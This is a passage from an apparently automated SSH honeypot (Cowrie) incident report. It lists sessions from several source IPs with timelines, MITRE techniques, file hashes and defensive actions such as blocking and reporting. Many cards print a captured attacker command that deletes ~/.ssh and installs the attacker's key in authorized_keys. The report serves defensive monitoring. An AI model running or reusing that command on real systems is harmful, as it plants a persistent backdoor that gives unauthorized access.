| `2026-06-04 11:18:44` | `cowrie.session.params` |
| `2026-06-04 11:18:44` | `cowrie.command.input` |
| `2026-06-04 11:18:45` | `cowrie.log.closed` |
| `2026-06-04 11:18:48` | `cowrie.session.params` |
| `2026-06-04 11:18:48` | `cowrie.command.input` |
| `2026-06-04 11:18:49` | `cowrie.log.closed` |
| `2026-06-04 11:18:52` | `cowrie.session.params` |
| `2026-06-04 11:18:52` | `cowrie.command.input` |
| `2026-06-04 11:18:53` | `cowrie.log.closed` |
| `2026-06-04 11:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.27.249[.]238` to AbuseIPDB if not already reported
- [ ] Block `59.27.249[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-027ea1091337

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:19 |
| **Last Seen** | 2026-06-04 11:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:19:39` | `cowrie.session.connect` |
| `2026-06-04 11:19:39` | `cowrie.client.version` |
| `2026-06-04 11:19:39` | `cowrie.client.kex` |
| `2026-06-04 11:19:40` | `cowrie.login.success` |
| `2026-06-04 11:19:41` | `cowrie.session.params` |
| `2026-06-04 11:19:41` | `cowrie.command.input` |
| `2026-06-04 11:19:41` | `cowrie.command.failed` |
| `2026-06-04 11:19:41` | `cowrie.log.closed` |
| `2026-06-04 11:19:42` | `cowrie.session.params` |
| `2026-06-04 11:19:42` | `cowrie.command.input` |
| `2026-06-04 11:19:42` | `cowrie.session.file_download` |
| `2026-06-04 11:19:42` | `cowrie.log.closed` |
| `2026-06-04 11:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca2dfc746983

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:19 |
| **Last Seen** | 2026-06-04 11:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:19:46` | `cowrie.session.connect` |
| `2026-06-04 11:19:46` | `cowrie.client.version` |
| `2026-06-04 11:19:47` | `cowrie.client.kex` |
| `2026-06-04 11:19:48` | `cowrie.login.success` |
| `2026-06-04 11:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e48aa01a31

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:24 |
| **Last Seen** | 2026-06-04 11:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:24:54` | `cowrie.session.connect` |
| `2026-06-04 11:24:54` | `cowrie.client.version` |
| `2026-06-04 11:24:55` | `cowrie.client.kex` |
| `2026-06-04 11:24:56` | `cowrie.login.success` |
| `2026-06-04 11:24:57` | `cowrie.session.params` |
| `2026-06-04 11:24:57` | `cowrie.command.input` |
| `2026-06-04 11:24:57` | `cowrie.command.failed` |
| `2026-06-04 11:24:57` | `cowrie.log.closed` |
| `2026-06-04 11:24:58` | `cowrie.session.params` |
| `2026-06-04 11:24:58` | `cowrie.command.input` |
| `2026-06-04 11:24:58` | `cowrie.session.file_download` |
| `2026-06-04 11:24:58` | `cowrie.log.closed` |
| `2026-06-04 11:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d446e1f0d23d

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:25 |
| **Last Seen** | 2026-06-04 11:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:25:02` | `cowrie.session.connect` |
| `2026-06-04 11:25:02` | `cowrie.client.version` |
| `2026-06-04 11:25:02` | `cowrie.client.kex` |
| `2026-06-04 11:25:04` | `cowrie.login.success` |
| `2026-06-04 11:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f826fa71c7f

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-06-04 11:52 |
| **Last Seen** | 2026-06-04 11:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:52:06` | `cowrie.session.connect` |
| `2026-06-04 11:52:06` | `cowrie.client.version` |
| `2026-06-04 11:52:07` | `cowrie.client.kex` |
| `2026-06-04 11:52:07` | `cowrie.login.success` |
| `2026-06-04 11:52:08` | `cowrie.session.params` |
| `2026-06-04 11:52:08` | `cowrie.command.input` |
| `2026-06-04 11:52:08` | `cowrie.command.failed` |
| `2026-06-04 11:52:08` | `cowrie.log.closed` |
| `2026-06-04 11:52:08` | `cowrie.session.params` |
| `2026-06-04 11:52:08` | `cowrie.command.input` |
| `2026-06-04 11:52:08` | `cowrie.session.file_download` |
| `2026-06-04 11:52:08` | `cowrie.log.closed` |
| `2026-06-04 11:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3583f222711

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]66` |
| **First Seen** | 2026-06-04 11:52 |
| **Last Seen** | 2026-06-04 11:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:52:11` | `cowrie.session.connect` |
| `2026-06-04 11:52:11` | `cowrie.client.version` |
| `2026-06-04 11:52:11` | `cowrie.client.kex` |
| `2026-06-04 11:52:11` | `cowrie.login.success` |
| `2026-06-04 11:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]66` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da1fa4c38537

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:03 |
| **Last Seen** | 2026-06-04 12:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:03:31` | `cowrie.session.connect` |
| `2026-06-04 12:03:31` | `cowrie.client.version` |
| `2026-06-04 12:03:31` | `cowrie.client.kex` |
| `2026-06-04 12:03:31` | `cowrie.login.success` |
| `2026-06-04 12:03:32` | `cowrie.session.params` |
| `2026-06-04 12:03:32` | `cowrie.command.input` |
| `2026-06-04 12:03:32` | `cowrie.command.failed` |
| `2026-06-04 12:03:32` | `cowrie.log.closed` |
| `2026-06-04 12:03:32` | `cowrie.session.params` |
| `2026-06-04 12:03:32` | `cowrie.command.input` |
| `2026-06-04 12:03:32` | `cowrie.session.file_download` |
| `2026-06-04 12:03:32` | `cowrie.log.closed` |
| `2026-06-04 12:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3a73511454

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:03 |
| **Last Seen** | 2026-06-04 12:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:03:34` | `cowrie.session.connect` |
| `2026-06-04 12:03:34` | `cowrie.client.version` |
| `2026-06-04 12:03:34` | `cowrie.client.kex` |
| `2026-06-04 12:03:34` | `cowrie.login.success` |
| `2026-06-04 12:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3406e66e7283

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:10 |
| **Last Seen** | 2026-06-04 12:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:10:00` | `cowrie.session.connect` |
| `2026-06-04 12:10:00` | `cowrie.client.version` |
| `2026-06-04 12:10:00` | `cowrie.client.kex` |
| `2026-06-04 12:10:01` | `cowrie.login.success` |
| `2026-06-04 12:10:01` | `cowrie.session.params` |
| `2026-06-04 12:10:01` | `cowrie.command.input` |
| `2026-06-04 12:10:01` | `cowrie.command.failed` |
| `2026-06-04 12:10:01` | `cowrie.log.closed` |
| `2026-06-04 12:10:01` | `cowrie.session.params` |
| `2026-06-04 12:10:01` | `cowrie.command.input` |
| `2026-06-04 12:10:01` | `cowrie.session.file_download` |
| `2026-06-04 12:10:01` | `cowrie.log.closed` |
| `2026-06-04 12:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd27259a1478

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:10 |
| **Last Seen** | 2026-06-04 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:10:03` | `cowrie.session.connect` |
| `2026-06-04 12:10:03` | `cowrie.client.version` |
| `2026-06-04 12:10:03` | `cowrie.client.kex` |
| `2026-06-04 12:10:04` | `cowrie.login.success` |
| `2026-06-04 12:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef433c3e4a57

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:16 |
| **Last Seen** | 2026-06-04 12:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:16:21` | `cowrie.session.connect` |
| `2026-06-04 12:16:21` | `cowrie.client.version` |
| `2026-06-04 12:16:21` | `cowrie.client.kex` |
| `2026-06-04 12:16:22` | `cowrie.login.success` |
| `2026-06-04 12:16:22` | `cowrie.session.params` |
| `2026-06-04 12:16:22` | `cowrie.command.input` |
| `2026-06-04 12:16:22` | `cowrie.command.failed` |
| `2026-06-04 12:16:22` | `cowrie.log.closed` |
| `2026-06-04 12:16:22` | `cowrie.session.params` |
| `2026-06-04 12:16:22` | `cowrie.command.input` |
| `2026-06-04 12:16:22` | `cowrie.session.file_download` |
| `2026-06-04 12:16:22` | `cowrie.log.closed` |
| `2026-06-04 12:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2141c728f18

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:16 |
| **Last Seen** | 2026-06-04 12:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:16:24` | `cowrie.session.connect` |
| `2026-06-04 12:16:24` | `cowrie.client.version` |
| `2026-06-04 12:16:24` | `cowrie.client.kex` |
| `2026-06-04 12:16:25` | `cowrie.login.success` |
| `2026-06-04 12:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c58fe168ecbb

| Field | Detail |
|---|---|
| **Source IP** | `51.195.109[.]79` |
| **First Seen** | 2026-06-04 12:20 |
| **Last Seen** | 2026-06-04 12:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:20:12` | `cowrie.session.connect` |
| `2026-06-04 12:20:12` | `cowrie.client.version` |
| `2026-06-04 12:20:12` | `cowrie.client.kex` |
| `2026-06-04 12:20:13` | `cowrie.login.success` |
| `2026-06-04 12:20:13` | `cowrie.session.params` |
| `2026-06-04 12:20:13` | `cowrie.command.input` |
| `2026-06-04 12:20:13` | `cowrie.command.failed` |
| `2026-06-04 12:20:13` | `cowrie.log.closed` |
| `2026-06-04 12:20:13` | `cowrie.session.params` |
| `2026-06-04 12:20:13` | `cowrie.command.input` |
| `2026-06-04 12:20:13` | `cowrie.session.file_download` |
| `2026-06-04 12:20:13` | `cowrie.log.closed` |
| `2026-06-04 12:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.195.109[.]79` to AbuseIPDB if not already reported
- [ ] Block `51.195.109[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a55d319ed5c

| Field | Detail |
|---|---|
| **Source IP** | `51.195.109[.]79` |
| **First Seen** | 2026-06-04 12:20 |
| **Last Seen** | 2026-06-04 12:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:20:16` | `cowrie.session.connect` |
| `2026-06-04 12:20:16` | `cowrie.client.version` |
| `2026-06-04 12:20:16` | `cowrie.client.kex` |
| `2026-06-04 12:20:16` | `cowrie.login.success` |
| `2026-06-04 12:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.195.109[.]79` to AbuseIPDB if not already reported
- [ ] Block `51.195.109[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08269e4911f4

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:35 |
| **Last Seen** | 2026-06-04 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:35:47` | `cowrie.session.connect` |
| `2026-06-04 12:35:47` | `cowrie.client.version` |
| `2026-06-04 12:35:47` | `cowrie.client.kex` |
| `2026-06-04 12:35:47` | `cowrie.login.success` |
| `2026-06-04 12:35:47` | `cowrie.session.params` |
| `2026-06-04 12:35:47` | `cowrie.command.input` |
| `2026-06-04 12:35:47` | `cowrie.command.failed` |
| `2026-06-04 12:35:47` | `cowrie.log.closed` |
| `2026-06-04 12:35:48` | `cowrie.session.params` |
| `2026-06-04 12:35:48` | `cowrie.command.input` |
| `2026-06-04 12:35:48` | `cowrie.session.file_download` |
| `2026-06-04 12:35:48` | `cowrie.log.closed` |
| `2026-06-04 12:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caf26baac95e

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:35 |
| **Last Seen** | 2026-06-04 12:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:35:49` | `cowrie.session.connect` |
| `2026-06-04 12:35:49` | `cowrie.client.version` |
| `2026-06-04 12:35:49` | `cowrie.client.kex` |
| `2026-06-04 12:35:50` | `cowrie.login.success` |
| `2026-06-04 12:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb98a358b079

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:40 |
| **Last Seen** | 2026-06-04 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
